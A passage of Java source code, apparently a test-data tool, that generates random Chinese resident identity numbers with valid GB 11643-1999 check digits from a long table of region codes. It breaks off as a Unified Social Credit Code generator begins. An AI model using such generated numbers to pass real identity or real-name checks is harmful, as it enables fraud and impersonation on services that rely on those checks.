","130681|涿州市","350400|三明","620722|民乐县","511527|筠连县","220382|双辽市","320903|盐都区","441423|丰顺县","530300|曲靖","140425|平顺县","320684|海门市","530823|景东县","420583|枝江市","350429|泰宁县","420527|秭归县","510811|昭化区","350625|长泰县","370104|槐荫区","511825|天全县","341524|金寨县","152527|太仆寺旗","610304|陈仓区","542330|仁布县","431126|宁远县","320124|溧水区","510107|武侯区","500110|万盛区","310116|金山区","220523|辉南县","330483|桐乡市","230624|杜尔伯特蒙县","500107|九龙坡区","141126|石楼县","530826|江城县","150429|宁城县","150625|杭锦旗","430723|澧县","320405|戚墅堰区","150424|林西县","141123|兴县","445322|郁南县","513332|石渠县","340822|怀宁县","310110|杨浦区","130503|桥西区","231181|北安市","340208|三山区","130481|武安市","411002|魏都区","532525|石屏县","210204|沙河口区","410781|卫辉市","623027|夏河县","530103|盘龙区","510503|纳溪区","360426|德安县","130434|魏县","610802|榆阳区","340111|包河区","500228|梁平县","654000|霍尔果斯市","130684|高碑店市","511112|五通桥区","530129|寻甸县","350624|诏安县","150100|呼和浩特","350302|城厢区","350722|浦城县","210181|新民市","411723|平舆县","469023|澄迈县","522701|都匀市","500120|铜梁区","511503|南溪区","420607|襄州区","141032|永和县","350503|丰泽区","360900|宜春","210726|黑山县","350303|涵江区","610627|甘泉县","620422|会宁县","360822|吉水县","542122|江达县","350923|屏南县","650202|独山子区","511521|宜宾县","430503|大祥区","441324|龙门县","320811|清浦区","140223|广灵县","520121|开阳县","451226|环江县","621123|渭源县","150925|凉城县","410611|淇滨区","340207|鸠江区","420502|西陵区","341302|埇桥区","210113|沈北新区","140430|沁县","150826|杭锦后旗","450100|南宁","320322|沛县","511126|夹江县","410328|洛宁县","610600|延安市","350821|长汀县","341225|阜南县","411221|渑池县","231081|绥芬河市","130822|兴隆县","150721|阿荣旗","421126|蕲春县","530424|华宁县","130533|威县","220181|九台区","330100|杭州","450924|兴业县","320623|如东县","410205|禹王台区","451028|乐业县","360481|瑞昌市","532323|牟定县","140723|和顺县","430424|衡东县","350781|邵武市","510681|广汉市","630000|青海","341521|寿县","210114|于洪区","220621|抚松县","371522|莘县","230402|向阳区","431103|冷水滩区","320924|射阳县","410728|长垣县","411326|淅川县","150627|伊金霍洛旗","330225|象山县","350205|海沧区","331102|莲都区","210521|本溪满族自治县","150922|化德县","350000|福建","620105|安宁区","650102|天山区","500117|合川区","431003|苏仙区","320116|六合区","513228|黑水县","360902|袁州区","530181|安宁市","421000|荆州市","330329|泰顺县","650109|米东区","410122|中牟县","430407|石鼓区","610522|潼关县","150825|乌拉特后旗","422822|建始县","150724|鄂温克族自治旗","130733|崇礼县","130107|井陉矿区","450303|叠彩区","130102|长安区","430522|新邵县","520114|观山湖区","440183|增城区","650205|乌尔禾区","410902|华龙区","211221|铁岭县","150523|开鲁县","131121|枣强县","440114|花都区","620524|武山县","220202|昌邑区","230704|友好区","420529|五峰县","610926|平利县","441402|梅江区","370403|薛城区","130109|藁城区","430600|岳阳","140421|长治县","520422|普定县","451100|贺州","360200|景德镇","370112|历城区","140411|郊区","130528|宁晋县","431200|怀化","510403|西区","320509|吴江区","140428|长子县","150421|阿鲁旗","150924|兴和县","230128|通河县","450109|邕宁区","220104|朝阳区","512000|资阳","321002|广陵区","640106|金凤区","610322|凤翔县","411302|宛城区","420113|汉南区","440303|罗湖区","231224|庆安县","511602|广安区","371526|高唐县","360723|大余县","320706|海州区","410311|洛龙区","371083|乳山市","341621|涡阳县","230709|金山屯","230903|桃山市","320106|鼓楼区","340203|弋江区","411724|正阳县","621027|镇原县","340600|淮北市","140322|盂县","130925|盐山县","542301|桑珠孜区","140500|晋城","650000|新疆","653000|克孜勒苏州","411103|郾城区","310000|上海","410322|孟津县","210804|鲅鱼圈区","510114|新都区","371425|齐河县","330200|宁波","640303|红寺堡区","532524|建水县","430408|蒸湘区","230706|翠峦区","340100|合肥市","431002|北湖区","230221|龙江县","210702|古塔区","361024|崇仁县","610830|清涧县","511011|东兴区","350702|延平区","610404|渭城区","611023|商南县","622900|临夏州","530925|双江县","441481|兴宁市","341702|贵池区","230104|道外区","441602|源城区","431225|会同县","510904|安居区","530381|宣威市","211005|弓长岭区","230521|集贤县","340402|大通区","350213|翔安区","450481|岑溪市","320803|淮安区","360983|高安市","440703|蓬江区","450305|七星区","140521|沁水县","450621|上思县","511700|达州","610111|灞桥区","150422|巴林左旗","320113|栖霞区","230811|郊区","511822|荥经县","330482|平湖市","451422|宁明县","522635|麻江县","130603|莲池区","621221|成县","430100|长沙","140426|黎城县","150722|莫力达瓦旗","420602|襄城区","321302|宿城区","130323|抚宁县","410303|西工区","350602|芗城区","430724|临澧县","469021|定安县","410103|二七区","431302|娄星区","210105|皇姑区","411500|信阳","330922|嵊泗县","360602|月湖区","320281|江阴市","632321|同仁县","370211|黄岛区","152525|东乌珠穆沁旗","532530|金平县","610324|扶风县","222424|汪清县","350504|洛江区","430481|耒阳市","340521|当涂县","330109|萧山区","410423|鲁山县","350628|平和县","511500|宜宾","360121|南昌县","520111|花溪区","610303|金台区","350182|长乐市","513425|会理县","231003|阳明区","152530|正蓝旗","321023|宝应县","320722|东海县","440100|广州市","532324|南华县","442000|中山市","530522|腾冲县","321181|丹阳市","140722|左权县","340828|岳西县","420205|铁山区","120114|武清区","371300|临沂","140825|新绛县","511302|顺庆区","610724|西乡县","120000|天津","410203|顺河回族区","610630|宜川县","610481|兴平市","360726|安远县","340602|杜集区","230000|黑龙江","632100|海东市","445321|新兴县","220100|长春市","350125|永泰县","152221|科尔沁右翼前旗","150600|鄂尔多斯","469028|陵水县","513326|道孚县","621225|西和县","141127|岚县","130208|丰润区","210403|东洲区","450200|柳州","410825|温县","150430|敖汉旗","330802|柯城区","431381|冷水江市","469025|白沙县","520100|贵阳","150784|额尔古纳市","411681|项城市","500111|大足区","410300|洛阳","150602|东胜区","610921|汉阴县","440825|徐闻县","350700|南平","330726|浦江县","341125|定远县","211103|兴隆台区","469002|琼海市","320311|泉山区","320724|灌南县","141028|吉县","522622|黄平县","510727|平武县","130126|灵寿县","520523|金沙县","610700|汉中市","532327|永仁县","130529|巨鹿县","411481|永城市","150404|松山区","130706|下花园区","610826|绥德县","140108|尖草坪区","330127|淳安县","152202|阿尔山市","230700|伊春","210881|盖州市","640202|大武口区","451029|田林县","411402|梁园区","210522|桓仁满族自治县","130428|肥乡县","410302|老城区","361129|万年县","511002|市中区","370702|潍城区","140502|城区","360302|安源区","321311|宿豫区","320612|通州区","330382|乐清市","211002|白塔区","410804|马村区","410325|嵩县","330411|秀洲区","420683|枣阳市","420581|宜都市","450302|秀峰区","421181|麻城市","330723|武义县","532625|马关县","320125|高淳区","654202|乌苏市","510923|大英县","520527|赫章县","120113|北辰区","610400|咸阳市","510724|安县","500112|渝北区","230805|东风区","632521|共和县","622924|广河县","430722|汉寿县","230127|木兰县","652101|高昌区","140600|朔州","220200|吉林市","532501|个旧市","230828|汤原县","410381|偃师市","430903|赫山区","431102|零陵区","141023|襄汾县","530500|保山","542522|札达县","441802|清城区","341500|六安市","511502|翠屏区","450124|马山县","360730|宁都县","411503|平桥区","320382|邳州市","632722|杂多县","440116|萝岗区","511600|广安","341722|石台县","130729|万全县","620922|瓜州县","445103|潮安区","450423|蒙山县","520602|碧江区","520502|七星关区","210123|康平县","130100|石家庄","340421|凤台县","130110|鹿泉区","451321|忻城县","640425|彭阳县","421087|松滋市","410703|卫滨区","360733|会昌县","361000|抚州","410421|宝丰县","340502|博望区","451225|罗城县","350783|建瓯市","340304|禹会区","110102|西城区","330185|临安市","360421|九江县","371626|邹平县","410200|开封","430223|攸县","360321|莲花县","621202|武都区","310113|宝山区","530822|墨江县","511000|内江","340703|狮子山区","441322|博罗县","510100|成都","310120|奉贤区","532325|姚安县","450981|北流市","130227|迁西县","469026|昌江县","610329|麟游县","441203|鼎湖区","623023|舟曲县","220623|长白县","210212|旅顺口区","530927|沧源县","320981|东台市","140727|祁县","341825|旌德县","430511|北塔区","451300|来宾","451121|昭平县","330822|常山县","410100|郑州","350825|连城县","640200|石嘴山市","622901|临夏市","361028|资溪县","410782|辉县市","650104|新市区","341823|泾县","620521|清水县","610323|岐山县","350427|沙县","610222|宜君县","710001|台中市","445122|饶平县","652222|巴里坤县","350305|秀屿区","150622|准格尔旗","532923|祥云县","211381|北票市","370829|嘉祥县","210921|阜新蒙古族自治县","620800|平凉","510421|米易县","431025|临武县","511304|嘉陵区","632724|治多县","430527|绥宁县","532924|宾川县","360824|新干县","340802|迎江区","340124|庐江县","620824|华亭县","210106|铁西区","640302|利通区","632522|同德县","431100|永州","331003|黄岩区","330304|瓯海区","513229|马尔康县","152201|乌兰浩特市","130502|桥东区","510121|金堂县","621102|安定区","331123|遂昌县","230881|同江市","510302|自流井区","441426|平远县","520324|正安县","530000|云南","460100|海口市","370406|山亭区","451324|金秀县","140802|盐湖区","320305|贾汪区","131100|衡水","440233|新丰县","542231|隆子县","610923|宁陕县","130602|竞秀区","152529|正镶白旗","451424|大新县","341623|利辛县","430482|常宁市","632001|乐都区","440882|雷州市","320300|徐州","410481|舞钢市","620400|白银","511133|马边彝族自治县","371428|武城县","450108|良庆区","130435|曲周县","140100|太原","441284|四会市","340400|淮南市","370500|东营","522325|贞丰县","500232|武隆县","411424|柘城县","211223|西丰县","431027|桂东县","820000|澳门","530630|水富县","360425|永修县","360924|宜丰县","441723|阳东区","513400|凉山州","431222|沅陵县","433124|花垣县","350181|福清市","421102|黄州区","410527|内黄县","532901|大理市","522732|三都县","210200|大连","330328|文成县","511028|隆昌县","513431|昭觉县","360500|新余","530324|罗平县","370105|天桥区","370802|市中区","210904|太平区","510802|利州区","610403|杨陵区","370827|鱼台县","230303|恒山市","445202|榕城区","330825|龙游县","220183|德惠市","542426|申扎县","530702|古城区","530624|大关县","360982|樟树市","130726|蔚县","220721|前郭尔罗斯县","110113|顺义区","320723|灌云县","511113|金口河区","511902|巴州区","210000|辽宁","220000|吉林","513434|越西县","350922|古田县","640521|中宁县","371700|菏泽","371525|冠县","341282|界首市","220800|白城市","222401|延吉市","130984|河间市","210124|法库县","621024|合水县","340200|芜湖市","430203|芦淞区","150205|石拐区","210682|凤城市","371623|无棣县","321101|镇江","341503|裕安区","230524|饶河县","150923|商都县","210304|立山区","341182|明光市","411325|内乡县","320831|金湖县","130622|清苑区","130721|宣化县","220524|柳河县","220211|丰满区","350481|永安市","653200|和田地区","542221|乃东县","222405|龙井市","450821|平南县","211481|兴城市","232701|加格达奇区","330106|西湖区","360830|永新县","150403|元宝山区","120105|河北区","140621|山阴县","460108|美兰区","361023|南丰县","141181|孝义市","530323|师宗县","340202|镜湖区","500116|江津区","331127|景宁县","360735|石城县","321283|泰兴市","513329|新龙县","340000|安徽","620702|甘州区","420103|江汉区","411300|南阳","513300|甘孜","450902|玉州区","130205|开平区","360424|修水县","361026|宜黄县","140423|襄垣县","650203|克拉玛依区","231202|北林区","410506|龙安区","130732|赤城县","320585|太仓市","341622|蒙城县","321012|江都区","620725|山丹县","370831|泗水县","530423|通海县","371602|滨城区","130621|满城区","230781|铁力市","130427|磁县","140121|清徐县","620522|秦安县","650100|乌鲁木齐市","510183|邛崃市","320611|港闸区","440883|吴川市","130728|怀安县","533100|德宏州","610203|印台区","370785|高密市","231281|安达市","130930|孟村回族自治县","450332|恭城县","621002|西峰区","130424|成安县","150626|乌审旗","141031|隰县","230202|龙沙区","610726|宁强县","511024|威远县","210303|铁西区","110108|海淀区","532932|鹤庆县","410502|文峰区","341821|郎溪县","210504|明山区","150928|察哈尔右翼后旗","340121|长丰县","411423|宁陵县","620923|肃北县","610582|华阴市","130202|路南区","610821|神木县","360826|泰和县","330503|南浔区","610922|石泉县","610824|靖边县","341221|临泉县","610502|临渭区","130523|内丘县","152526|西乌珠穆沁","430426|祁东县","230206|富拉尔基区","421081|石首市","150402|红山区","420107|青山区","130207|丰南区","341002|屯溪区","210802|站前区","110117|平谷区","513322|泸定县","451425|天等县","450321|阳朔县","540121|林周县","371082|荣成市","130923|东光县","360821|吉安县","510521|泸县","370102|历下区","140923|代县","140929|岢岚县","542624|墨脱县","140429|武乡县","500104|大渡口区","620823|崇信县","370125|济阳县","431230|通道县","441502|城区","441622|龙川县","450328|龙胜县","510131|蒲江县","211404|南票区","110112|通州区","621124|临洮县","210882|大石桥市","140105|小店区","320700|连云港","230404|南山区","150926|察哈尔右翼前旗","532329|武定县","350424|宁化县","361002|临川区","330702|婺城区","150700|扎赉诺尔区","350121|闽侯县","420682|老河口市","320200|无锡","140427|壶关县","420111|洪山区","542521|普兰县","500235|云阳县","640324|同心县","542500|阿里","450202|城中区","621121|通渭县","410711|牧野区","450222|柳城县","411121|舞阳县","130324|卢龙县","150223|达尔罕旗","542526|改则县","360800|吉安","140311|郊区","150623|鄂托克前旗","621026|宁县","140924|繁峙县","210602|元宝区","360323|芦溪县","371322|郯城县","632701|玉树市","131000|廊坊","513330|德格县","451025|靖西县","130724|沽源县","220102|南关区","231121|嫩江县","419001|济源","350102|鼓楼区","411321|南召县","610822|府谷县","350100|福州","511181|峨眉山市","622927|积石山县","532326|大姚县","441521|海丰县","530322|陆良县","220122|农安县","450221|柳江县","410822|博爱县","231222|兰西县","371427|夏津县","231025|林口县","532531|绿春县","360729|全南县","460107|琼山区","330203|海曙区","150125|武川县","530924|镇康县","431000|郴州","150000|内蒙古","370786|昌邑市","211003|文圣区","411527|淮滨县","510726|北川县","130903|运河区","370705|奎文区","220182|榆树市","520425|紫云县","140525|泽州县","500237|巫山县","371727|定陶县","532931|剑川县","542334|亚东县","429021|神农架","420104|硚口区","350629|华安县","330784|永康市","370687|海阳市","469027|乐东县","440112|黄埔区","540122|当雄县","141124|临县","210903|新邱区","370725|昌乐县","620403|平川区","341822|广德县","130426|涉县","210302|铁东区","621222|文县","430811|武陵源区","360100|南昌","360734|寻乌县","542425|安多县","450804|覃塘区","370200|青岛","650200|克拉玛依市","231083|海林市","513327|炉霍县","140981|原平市","340881|桐城市","321202|海陵区","220284|磐石市","611026|柞水县","441881|英德市","522632|榕江县","231123|逊克县","522624|三穗县","130321|青龙县","420321|郧阳区","451222|天蛾县","350206|湖里区","320111|浦口区","330103|下城区","445200|揭阳市","411025|襄城县","520522|黔西县","440514|潮南区","410926|范县","211321|朝阳县","150723|鄂伦春自治旗","370800|济宁","632825|大柴旦行委","371725|郓城县","430581|武冈市","420703|华容区","321111|润州区","340500|马鞍山","410324|栾川县","632826|茫崖行委","610428|长武县","530828|澜沧县","430221|株洲县","513430|金阳县","230710|五营区","610115|临潼区","411324|镇平县","430300|湘潭","513337|稻城县","230305|梨树区","371100|日照","542124|类乌齐县","450421|苍梧县","350800|龙岩","370612|牟平区","650107|达坂城区","410223|尉氏县","640323|盐池县","371625|博兴县","520322|桐梓县","130421|邯郸县","441700|阳江市","211081|灯塔市","210624|宽甸满族自治县","310109|虹口区","530111|官渡区","410821|修武县","510422|盐边县","620104|西固区","131128|阜城县","511681|华蓥市","540125|堆龙德庆县","420324|竹溪县","610202|王益区","230712|汤旺河","131028|大厂回族自治县","222426|安图县","510700|绵阳","610112|未央区","640424|泾源县","350782|武夷山市","222403|敦化市","433122|泸溪县","210803|西市区","420500|宜昌市","430204|石峰区","220103|宽城区","130425|大名县","511900|巴中","510822|青川县","360402|庐山区","610924|紫阳县","130637|博野县","530521|施甸县","130181|辛集市","140402|城区","421182|武穴市","430202|荷塘区","522630|台江县","441421|梅县区","610725|勉县","230711|乌马河","141130|交口县","441721|阳西县","320104|秦淮区","522723|贵定县","140110|晋源区","620122|皋兰县","140902|忻府区","542225|琼结县","513328|甘孜县","211322|建平县","320324|睢宁县","652122|鄯善县","510921|蓬溪县","422823|巴东县","420323|竹山县","130927|南皮县","370613|莱山区","522726|独山县","220702|宁江区","440229|翁源县","330600|绍兴","230203|建华区","141029|乡宁县","511425|青神县","500241|秀山县","640502|沙坡头区","522323|普安县","411502|浉河区","361022|黎川县","532621|文山县","510524|叙永县","520623|石阡县","410105|金水区","330621|柯桥区","360123|安义县","220502|东昌区","621200|陇南","530600|昭通","540124|曲水县","210102|和平区","420505|猇亭区","410928|濮阳县","321112|丹徒区","130230|曹妃甸区","150400|赤峰市","451123|富川县","511400|眉山","630104|城西区","321200|泰州","420102|江岸区","451122|钟山县","640300|吴忠市","230103|南岗区","610302|渭滨区","350304|荔城区","320582|张家港市","411523|新县","350583|南安市","420802|东宝区","610800|榆林市","610422|三原县","430121|长沙县","230183|尚志市","421200|咸宁市","542430|尼玛县","540000|西藏","430124|宁乡县","341824|绩溪县","150123|和林格尔县","330903|普陀区","140823|闻喜县","340604|烈山区","361130|婺源县","610621|延长县","610823|横山县","632525|贵南县","331124|松阳县","620100|兰州","150727|新巴尔虎右旗","420381|丹江口市","141024|洪洞县","130630|涞源县","220303|铁东区","140222|天镇县","370502|东营区","411100|漯河","360921|奉新县","411524|商城县","120110|东丽区","140202|城区","441303|惠阳区","141081|侯马市","451423|龙州县","530112|西山区","440784|鹤山市","522629|剑河县","411624|沈丘县","520600|铜仁市","230715|红星区","431021|桂阳县","361030|广昌县","451229|大化县","230124|方正县","131002|安次区","530427|新平县","230500|双鸭山","220882|大安市","513428|普格县","632524|兴海县","130631|望都县","621125|漳县","440811|麻章区","410811|山阳区","621224|康县","445102|湘桥区","140830|芮城县","610602|宝塔区","430623|华容县","450224|融安县","530421|江川县","222402|图们市","320312|铜山区","130929|献县","460106|龙华区","370685|招远市","411726|泌阳县","510525|古蔺县","533400|迪庆州","130628|高阳县","450103|青秀区","441600|河源市","542324|定日县","360732|兴国县","321284|姜堰区","330681|诸暨市","532523|屏边县","340825|太湖县","620623|天祝藏族自治县","441781|阳春市","440232|乳源县","451021|田阳县","430211|天元区","640522|海原县","330108|滨江区","422802|利川市","410482|汝州市","220203|龙潭区","130526|任县","130111|栾城区","511702|通川区","620102|城关区","431023|永兴县","330102|上城区","130802|双桥区","320302|鼓楼区","411700|驻马店","340222|繁昌县","410726|延津县","510502|江阳区","320922|滨海县","510922|射洪县","230622|肇源县","532925|弥渡县","530629|威信县","520625|印江县","532928|永平县","440785|恩平市","420528|长阳县","131122|武邑县","620821|泾川县","632500|海南州","421124|英山县","371426|平原县","620700|张掖","542322|南木林县","441826|连南县","623001|合作市","360400|九江","420281|大冶市","150621|达拉特旗","350403|三元区","410721|新乡县","210681|东港市","652123|托克逊县","140824|稷山县","130225|乐亭县","370782|诸城市","440705|新会区","210282|普兰店市","130803|双滦区","231024|东宁县","433101|吉首市","130924|海兴县","230304|滴道区","350111|晋安区","330322|洞头区","621223|宕昌县","150524|库伦旗","230400|鹤岗","532527|泸西县","440115|南沙区","371002|环翠区","220282|桦甸市","361127|余干县","120101|和平区","433126|古丈县","513222|理县","130423|临漳县","542126|察雅县","210727|义县","450502|海城区","610623|子长县","371311|罗庄区","210423|清原满族自治县","445300|云浮市","520112|乌当区","652100|吐鲁番市","140302|城区","500240|石柱县","410522|安阳县","330522|长兴县","620502|秦州区","440605|南海区","451281|宜州市","640205|惠农区","620111|红古区","542525|革吉县","411623|商水县","410725|原阳县","450700|钦州","441223|广宁县","330381|瑞安市","420525|远安县","370703|寒亭区","320802|清河区","141021|曲沃县","350802|新罗区","340603|相山区","542229|加查县","620902|肃州区","210281|瓦房店市","131124|饶阳县","230129|延寿县","522627|天柱县","330824|开化县","530628|彝良县","450122|武鸣区","152500|锡林郭勒盟","450126|宾阳县","130722|张北县","230381|虎林市","371102|东港区","632726|曲麻莱县","420921|孝昌县","451030|西林县","513433|冕宁县","530625|永善县","360923|上高县","350626|东山县","371202|莱城区","650121|乌鲁木齐县","130105|新华区","431022|宜章县","431202|鹤城区","530824|景谷县","340404|谢家集区","141100|吕梁","141000|临汾","450327|灌阳县","330682|上虞区","360724|上犹县","451000|百色","421125|浠水县","140522|阳城县","632323|泽库县","450304|象山区","411102|源汇区","120102|河东区","431226|麻阳县","410400|平顶山","510725|梓潼县","511824|石棉县","420115|江夏区","331021|玉环县","360731|于都县","341103|南谯区","610430|淳化县","350582|晋江市","532900|大理州","150822|磴口县","360222|浮梁县","341424|和县","469003|儋州市","320481|溧阳市","350823|上杭县","130827|宽城县","331024|仙居县","140829|平陆县","610124|周至县","350103|台江区","140927|神池县","130104|桥西区","341004|徽州区","440305|南山区","522700|黔南州","610622|延川县","440802|赤坎区","230523|宝清县","350428|将乐县","450802|港北区","131102|桃城区","330783|东阳市","410222|通许县","532800|西双版纳州","542424|聂荣县","429004|仙桃市","220204|船营区","510184|崇州市","210703|凌河区","220302|铁西区","330781|兰溪市","410182|荥阳市","340803|大观区","370405|台儿庄区","513226|金川县","511621|岳池县","210224|长海县","632801|格尔木市","450323|灵川县","430900|益阳","520300|遵义","622926|东乡族自治县","420504|点军区","140212|新荣区","320921|响水县","450500|北海","350505|泉港区","652200|哈密地区","360725|崇义县","350122|连江县","653125|莎车县","640100|银川市","340223|南陵县","440500|汕头市","230109|松北区","520102|南明区","520381|赤水市","411082|长葛市","371500|聊城","440000|广东","410425|郏县","410602|鹤山区","411323|西峡县","130826|丰宁满族自治县","361122|广丰区","230604|让胡路区","500103|渝中区","542127|八宿县","530829|西盟县","513436|美姑县","211400|葫芦岛","421202|咸安区","150823|乌拉特前旗","231005|西安区","542400|那曲","310104|徐汇区","321322|沭阳县","411222|陕州区","430626|平江县","610524|合阳县","360681|贵溪市","370400|枣庄","500106|沙坪坝区","152922|阿拉善右旗","623022|卓尼县","370881|曲阜市","150929|四子王旗","371726|鄄城县","210323|岫岩满族自治县","152200|兴安盟","420105|汉阳区","320482|金坛区","361123|玉山县","341203|颍东区","150425|克什克腾旗","130636|顺平县","510823|剑阁县","522636|丹寨县","140300|阳泉","152223|扎赉特旗","370522|利津县","150207|九原区","532622|砚山县","140800|运城","360926|铜鼓县","330105|拱墅区","410622|淇县","511703|达川区","211303|龙城区","340302|龙子湖区","140603|平鲁区","140882|河津市","150900|乌兰察布","330500|湖州","130532|平乡县","520122|息烽县","370203|市北区","320205|锡山区","440800|湛江市","653226|于田县","130581|南宫市","340824|潜山县","430523|邵阳县","371203|钢城区","130525|隆尧县","370682|莱阳市","130129|赞皇县","321282|靖江市","350603|龙文区","310101|黄浦区","230822|桦南县","320381|新沂市","310117|松江区","110229|延庆县","320206|惠山区","411224|卢氏县","411628|鹿邑县","340522|含山县","150726|新巴尔虎左旗","361121|上饶县","441624|和平县","350128|平潭县","320681|启东市","120104|南开区","410183|新密市","542133|边坝县","542200|山南","330523|安吉县","370283|平度市","450123|隆安县","460105|秀英区","130130|无极县","152501|二连浩特市","620000|甘肃省","513221|汶川县","220112|双阳区","220723|乾安县","330324|永嘉县","140481|潞城市","371324|兰陵县","230123|依兰县","410823|武陟县","360313|湘东区","632122|民和县","320412|武进区","520624|思南县","411328|唐河县","650106|头屯河区","610730|佛坪县","210781|凌海市","371702|牡丹区","360322|上栗县","220322|梨树县","130626|定兴县","340221|芜湖县","220700|松原市","513200|阿坝","120106|红桥区","500230|丰都县","460000|海南","513223|茂县","469006|万宁市","211402|连山区","231226|绥棱县","513432|喜德县","451481|凭祥市","520328|湄潭县","532503|蒙自市","469022|屯昌县","540126|达孜县","440604|禅城区","340322|五河县","630102|城东区","210500|本溪","420116|黄陂区","530402|红塔区","210800|营口","231223|青冈县","532532|河口县","440902|茂南区","469029|保亭县","630105|城北区","611021|洛南县","430721|安乡县","231004|爱民区","511300|南充","411521|罗山县","130204|古冶区","150300|乌海市","652700|博尔塔拉州","150200|包头市","130725|尚义县","441621|紫金县","421002|沙市区","420114|蔡甸区","420981|应城市","520382|仁怀市","331082|临海市","231124|孙吴县","632623|甘德县","620600|武威","370783|寿光市","410702|红旗区","621126|岷县","330110|余杭区","420624|南漳县","420506|夷陵区","320204|北塘区","150203|昆都仑区","220300|四平市","150921|卓资县","430902|资阳区","450204|柳南区","341226|颍上县","150781|满洲里","450603|防城区","230722|嘉荫县","210902|海州区","210100|沈阳","371523|茌平县","450921|容县","440983|信宜市","530602|昭阳区","130403|丛台区","350881|漳平市","530627|镇雄县","440403|斗门区","230714|乌伊岭","361027|金溪县","330727|磐安县","411024|鄢陵县","370213|李沧区","140211|南郊区","220622|靖宇县","152524|苏尼特右旗","530623|盐津县","450422|藤县","610828|佳县","411421|民权县","230904|茄子河区","450205|柳北区","370113|长清区","130402|邯山区","420684|宜城市","522631|黎平县","450107|西乡塘区","520325|道真县","513321|康定市","632725|囊谦县","440104|越秀区","620723|临泽县","652223|伊吾县","420626|保康县","341181|天长市","371321|沂南县","321084|高邮市","140321|平定县","420800|荆门市","152522|阿巴嘎旗","440606|顺德区","330400|嘉兴","620500|天水","611022|丹凤县","411400|商丘","540127|墨竹工卡县","520500|毕节市","370126|商河县","410306|吉利区","410221|杞县","360925|靖安县","441422|大埔县","522328|安龙县","411727|汝南县","411525|固始县","230826|桦川县","530426|峨山县","520521|大方县","620103|七里河区","310107|普陀区","140226|左云县","632523|贵德县","450722|浦北区","410883|孟州市","520000|贵州","360430|彭泽县","330283|奉化市","450400|梧州","640221|平罗县","433130|龙山县","610729|留坝县","370724|临朐县","420325|房县","340323|固镇县","150981|丰镇市","630123|湟源县","350123|罗源县","131127|景县","370323|沂源县","220381|公主岭市","610631|黄龙县","371081|文登区","522601|凯里市","150526|扎鲁特旗","610521|华县","420112|东西湖区","411122|临颍县","131022|固安县","659001|石河子市","130800|承德","640500|中卫市","430382|韶山市","440307|龙岗区","110101|东城区","440823|遂溪县","230321|鸡东县"};

        //随机出生日期
        Calendar birthday = Calendar.getInstance();
        birthday.set(Calendar.YEAR, (int) (Math.random() * 40) + 1980);
        birthday.set(Calendar.MONTH, (int) (Math.random() * 12));
        birthday.set(Calendar.DATE, (int) (Math.random() * 31));

        StringBuilder builder = new StringBuilder();
        builder.append(birthday.get(Calendar.YEAR));
        long month = birthday.get(Calendar.MONTH) + 1;
        if (month < 10) {
            builder.append("0");
        }
        builder.append(month);
        long date = birthday.get(Calendar.DATE);
        if (date < 10) {
            builder.append("0");
        }
        String birth_date = builder.append(date).toString();

        //随机三位数
        String codes;
        int code = (int) (Math.random() * 1000);
        if (code < 10) {
            codes =  "00" + code;
        } else if (code < 100) {
            codes = "0" + code;
        } else {
            codes = "" + code;
        }

        /*
         * <p>18位身份证验证</p>
         * 根据〖中华人民共和国国家标准 GB 11643-1999〗中有关公民身份号码的规定，公民身份号码是特征组合码，由十七位数字本体码和一位数字校验码组成。
         * 排列顺序从左至右依次为：六位数字地址码，八位数字出生日期码，三位数字顺序码和一位数字校验码。
         * 第十八位数字(校验码)的计算方法为：
         * 1.将前面的身份证号码17位数分别乘以不同的系数。从第一位到第十七位的系数分别为：7 9 10 5 8 4 2 1 6 3 7 9 10 5 8 4 2
         * 2.将这17位数字和系数相乘的结果相加。
         * 3.用加出来和除以11，看余数是多少？
         * 4.余数只可能有0 1 2 3 4 5 6 7 8 9 10这11个数字。其分别对应的最后一位身份证的号码为1 0 X 9 8 7 6 5 4 3 2。
         * 5.通过上面得知如果余数是2，就会在身份证的第18位数字上出现罗马数字的Ⅹ。如果余数是10，身份证的最后一位号码就是2。
         */
        Random rd = new Random();
        int index = rd.nextInt(sfz_list.length);
        String[] temp = sfz_list[index].split("\\|");//随机地区

        //17位数的身份证，待校验最后一位
        sfz = temp[0] + birth_date + codes;
        char[] chr_sfz = sfz.toCharArray();

        int[] c = { 7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2 };
        char[] r = { '1', '0', 'X', '9', '8', '7', '6', '5', '4', '3', '2' };
        int[] n = new int[17];
        int result = 0;
        for (int i = 0; i < n.length; i++) {
            n[i] = Integer.parseInt(chr_sfz[i] + "");
        }
        for (int i = 0; i < n.length; i++) {
            result += c[i] * n[i];
        }
        String ends = String.valueOf(r[result % 11]);

        //全部加起来
        sfz += ends;

        jta.setText(jta.getText()+"\n"+sfz);
        jta.setText(jta.getText()+"\n身份证所属地："+temp[1]);
        jta.setText(jta.getText()+"\n出生日期："+birth_date);

        return sfz;
    }

    //统一社会信用代码
    private String data3_end(){
        Random rd = new Random();

        String[]  orgCode_list = {"1|机构编制","2|外交","3|教育","4|公安","5|民政","6|司法","7|交通运输","8|文化","9|工商","A|中央军委改革和编制办公室","N|农业","Y|其他"};
        String[] icCode_list = {"1|机关&2|事业单位&3|中央编办直接管理机构编制的群众团体&9|其他","1|外国常驻新闻机构&9|其他","1|律师执业机构&2|公证处&3|基层法律服务所&4|司法鉴定机构&5|仲裁委员会&9|其他","1|外国在华文化中心&9|其他","1|社会团体&2|民办非企业单位&3|基金会&9|其他","1|外国旅游部门常驻机构代表机构&2|港澳台地区旅游部门常驻内地（大陆）代表机构&9|其他","1|宗教活动场所&2|宗教院校&9|其他","1|基层工会&9|其他","1|企业&2|个体工商户&3|农民专业社","1|军队事业单位&9|其他","1|组级集体经济组织&2|村级集体经济组织&3|乡镇集体经济组织&9|其他","1|其他"};
        String[] areas_list = {"110000", "110101", "110102", "110103", "110104", "110105", "110106", "110107", "110108", "110109",
                "110111", "110112", "110113", "110114", "110115", "110116", "110117", "110228", "110229", "120000",
                "120101", "120102", "120103", "120104", "120105", "120106", "120107", "120108", "120109", "120110",
                "120111", "120112", "120113", "120114", "120115", "120221", "120223", "120225", "130000", "130100",
                "130102", "130103", "130104", "130105", "130107", "130108", "130121", "130123", "130124", "130125",
                "130126", "130127", "130128", "130129", "130130", "130131", "130132", "130133", "130181", "130182",
                "130183", "130184", "130185", "130200", "130202", "130203", "130204", "130205", "130207", "130208",
                "130223", "130224", "130225", "130227", "130229", "130230", "130281", "130283", "130300", "130302",
                "130303", "130304", "130321", "130322", "130323", "130324", "130400", "130402", "130403", "130404",
